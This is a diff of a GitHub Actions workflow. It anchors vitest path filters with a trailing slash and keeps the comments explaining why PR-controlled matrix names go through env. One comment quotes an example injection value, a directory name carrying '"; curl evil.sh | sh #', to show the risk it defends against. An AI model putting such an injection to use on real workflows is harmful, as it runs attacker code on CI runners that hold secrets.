@@ -135,7 +135,10 @@ jobs:
       # skill directory name (e.g. containing `"; curl evil.sh | sh #`) execute on the runner,
       # since GitHub expands the template BEFORE bash sees the line. Pass it through env instead,
       # so it reaches the shell as a plain variable value, never as script text.
-      - run: npx vitest run "skills/$SKILL_NAME"
+      # Trailing slash, not a bare name: vitest's positional filter is a SUBSTRING match on the
+      # file path, so "skills/foo" would also collect skills/foo-lite/**. Anchoring on the
+      # directory separator keeps a matrix job to the suite it was scheduled for.
+      - run: npx vitest run "skills/$SKILL_NAME/"
         env:
           SKILL_NAME: ${{ matrix.skill }}
           OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
@@ -178,7 +181,10 @@ jobs:
       #
       # matrix.agent, same as matrix.skill above: a PR-controlled directory name, passed through
       # env rather than interpolated into the run: line, so it can't be read as script text.
-      - run: npx vitest run "agents/$AGENT_NAME"
+      # Trailing slash — same substring-match reason as the skill tier above. Without it the
+      # architecture-reviewer job also collected agents/architecture-reviewer-lite/**, so a
+      # second suite's failures were reported against this agent.
+      - run: npx vitest run "agents/$AGENT_NAME/"
         env:
           AGENT_NAME: ${{ matrix.agent }}
           OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
